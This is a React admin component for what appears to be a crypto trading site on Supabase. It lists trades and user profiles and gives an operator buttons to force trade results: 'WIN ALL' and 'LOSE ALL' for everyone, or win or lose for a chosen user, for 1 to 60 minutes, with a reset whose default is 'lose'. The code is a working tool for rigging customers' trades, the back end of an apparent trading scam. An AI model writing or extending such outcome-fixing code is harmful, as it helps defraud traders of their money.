import {
  useEffect,
  useState
} from "react";

import {
  useNavigate
} from "react-router-dom";

import {
  supabase
} from "../../lib/supabase";

import "./AdminTrades.css";


export default function AdminTrades(){


const navigate = useNavigate();


const [trades,setTrades] = useState([]);

const [control,setControl] = useState(null);

const [users,setUsers] = useState([]);

const [selectedUser,setSelectedUser] = useState("");

const [minutes,setMinutes] = useState(10);

const [loading,setLoading] = useState(false);

const [message,setMessage] = useState("");




// =========================
// START LOAD
// =========================


useEffect(()=>{

loadTrades();

loadControl();

loadUsers();


},[]);




// =========================
// LOAD TRADES
// =========================


const loadTrades = async()=>{


setLoading(true);


const {
data,
error
}= await supabase

.from("trades")

.select("*")

.order(
"created_at",
{
ascending:false
}
)

.limit(100);



if(error){

console.log(error);

setLoading(false);

return;

}



setTrades(data || []);


setLoading(false);


};




// =========================
// LOAD CONTROL
// =========================


const loadControl = async()=>{

const { data, error } = await supabase
.from("trade_control")
.select("*")
.limit(1)
.maybeSingle();


console.log("NEW CONTROL =",data);
console.log("NEW ERROR =",error);



if(error){

console.log(error);
return;

}



if(!data){

console.log("NO CONTROL DATA");

return;

}



setControl(data);


};





// =========================
// LOAD USERS
// =========================


const loadUsers = async()=>{


const {
data,
error
}= await supabase

.from("profiles")

.select(`

id,

member_id,

first_name,

last_name,

phone

`)

.order(
"id",
{
ascending:false
}
);



if(error){

console.log(error);

return;

}



setUsers(data || []);


};




// =========================
// REFRESH
// =========================


const refreshAll = ()=>{


loadTrades();

loadControl();

loadUsers();


};

// =========================
// GLOBAL WIN / LOSE CONTROL
// =========================





const setGlobalResult = async(result)=>{


console.log("CURRENT CONTROL =",control);


if(!control){

alert("Control not found");

return;

}


let until = null;



if(minutes > 0){


until = new Date(

Date.now()

+

minutes * 60 * 1000

)

.toISOString();


}





const {
error
}= await supabase

.from("trade_control")

.update({

global_result:result,

global_until:until

})

.eq(
"id",
1
);




if(error){

console.log(error);

alert(error.message);

return;

}




setMessage(
`Global ${result} ${minutes} minute`
);


await loadControl();

console.log("UPDATED RESULT =",result);


};





// =========================
// RESET GLOBAL
// =========================


const resetGlobal = async()=>{


if(!control){

return;

}



const {
error
}= await supabase

.from("trade_control")

.update({

global_result:"lose",

global_until:null

})

.eq(

"id",

control.id

);




if(error){

alert(error.message);

return;

}



setMessage(
"Reset default lose"
);



loadControl();


};






// =========================
// USER WIN / LOSE CONTROL
// =========================


const setUserResult = async(result)=>{


if(!selectedUser){


alert(
"Please select user"
);


return;


}




const until = new Date(

Date.now()

+

minutes * 60 * 1000

)

.toISOString();






const {
data:old
}= await supabase

.from("trade_user_control")

.select("*")

.eq(

"user_id",

selectedUser

)

.single();






if(old){



const {
error
}= await supabase

.from("trade_user_control")

.update({

result:result,

until_time:until

})

.eq(

"user_id",

selectedUser

);




if(error){

alert(error.message);

return;

}



}else{



const {
error
}= await supabase

.from("trade_user_control")

.insert({

user_id:selectedUser,

result:result,

until_time:until

});




if(error){

alert(error.message);

return;

}



}





setMessage(

`User ${result} ${minutes} minute`

);


};

// =========================
// GET USER NAME
// =========================


const getUserName = (id)=>{


const user = users.find(
u=>u.id === id
);



if(!user){

return id;

}



return (

(user.member_id || id)

+

" "

+

(user.first_name || "")

+

" "

+

(user.last_name || "")

);


};






// =========================
// GET USER CONTROL
// =========================


const getUserControl = async(userId)=>{


const {
data
}= await supabase

.from("trade_user_control")

.select("*")

.eq(

"user_id",

userId

)

.maybeSingle();



return data;


};






// =========================
// REMOVE USER CONTROL
// =========================


const removeUserControl = async(userId)=>{


const {
error
}= await supabase

.from("trade_user_control")

.delete()

.eq(

"user_id",

userId

);




if(error){

alert(error.message);

return;

}



setMessage(
"User control removed"
);


};






// =========================
// CHECK EXPIRE
// =========================


const checkTime = (time)=>{


if(!time){

return "-";

}



const now = new Date();

const end = new Date(time);



if(end < now){

return "Expired";

}



return end.toLocaleString();


};






// =========================
// FORMAT NUMBER
// =========================


const formatNumber = (num)=>{


return Number(num || 0)

.toLocaleString();



};

return (

<div
style={{
minHeight:"100vh",
background:"#06152d",
color:"#fff",
padding:"25px"
}}
>


<div
style={{
display:"flex",
alignItems:"center",
gap:"20px",
marginBottom:"25px"
}}
>


<button

onClick={()=>navigate("/admin")}

style={{
padding:"10px 20px",
borderRadius:10,
cursor:"pointer"
}}

>

← Back

</button>


<h1>

Trade Management

</h1>


</div>





{
message &&

<div
style={{
background:"#0f766e",
padding:15,
borderRadius:10,
marginBottom:20
}}
>

{message}

</div>

}







<div
style={{
background:"#111d32",
padding:20,
borderRadius:15,
marginBottom:25
}}
>


<h2>

Global Trade Control

</h2>



<p>

Current :

<b>

&nbsp;

{

control?.global_result || "-"

}

</b>

</p>



<p>

Until :

{

control?.global_until

?

checkTime(control.global_until)

:

"Forever"

}

</p>




<select

value={minutes}

onChange={
e=>setMinutes(
Number(e.target.value)
)
}

style={{
padding:10,
borderRadius:8,
marginRight:10
}}

>


<option value={1}>
1 Minute
</option>


<option value={5}>
5 Minutes
</option>


<option value={10}>
10 Minutes
</option>


<option value={30}>
30 Minutes
</option>


<option value={60}>
60 Minutes
</option>


</select>





<button

onClick={()=>setGlobalResult("win")}

style={{
background:"#16a34a",
color:"#fff",
padding:"12px 25px",
border:0,
borderRadius:10,
marginRight:10,
cursor:"pointer"
}}

>

WIN ALL

</button>






<button

onClick={()=>setGlobalResult("lose")}

style={{
background:"#dc2626",
color:"#fff",
padding:"12px 25px",
border:0,
borderRadius:10,
marginRight:10,
cursor:"pointer"
}}

>

LOSE ALL

</button>






<button

onClick={resetGlobal}

style={{
background:"#475569",
color:"#fff",
padding:"12px 25px",
border:0,
borderRadius:10,
cursor:"pointer"
}}

>

RESET

</button>




</div>








<div
style={{
background:"#111d32",
padding:20,
borderRadius:15,
marginBottom:25
}}
>


<h2>

User Control

</h2>




<select

value={selectedUser}

onChange={
e=>setSelectedUser(e.target.value)
}

style={{
padding:10,
borderRadius:8
}}

>


<option value="">

Select User

</option>



{

users.map(u=>(


<option

key={u.id}

value={u.id}

>

{u.member_id}

-

{u.first_name}

{u.last_name}

</option>


))


}



</select>





<button

onClick={()=>setUserResult("win")}

style={{
marginLeft:10,
background:"#16a34a",
color:"#fff",
padding:"10px 20px",
border:0,
borderRadius:8
}}

>

USER WIN

</button>





<button

onClick={()=>setUserResult("lose")}

style={{
marginLeft:10,
background:"#dc2626",
color:"#fff",
padding:"10px 20px",
border:0,
borderRadius:8
}}

>

USER LOSE

</button>




</div>









<div>

<h2>

Trade List

</h2>



<table

style={{
width:"100%",
background:"#111d32",
borderCollapse:"collapse"
}}

>


<thead>

<tr>

<th>ID</th>

<th>User</th>

<th>Coin</th>

<th>Side</th>

<th>Amount</th>

<th>Duration</th>

<th>Result</th>

<th>Status</th>

<th>Date</th>


</tr>

</thead>



<tbody>


{

trades.map(item=>(


<tr

key={item.id}

>


<td>

#{item.id}

</td>



<td>

{getUserName(item.user_id)}

</td>




<td>

{item.coin}

</td>




<td>

{item.side}

</td>




<td>

{formatNumber(item.amount)}

</td>




<td>

{item.duration} นาที

</td>




<td>

{item.result || "-"}

</td>




<td>

{item.status}

</td>




<td>

{

new Date(
item.created_at
)
.toLocaleString()

}

</td>



</tr>


))


}



</tbody>



</table>



</div>





</div>


);


}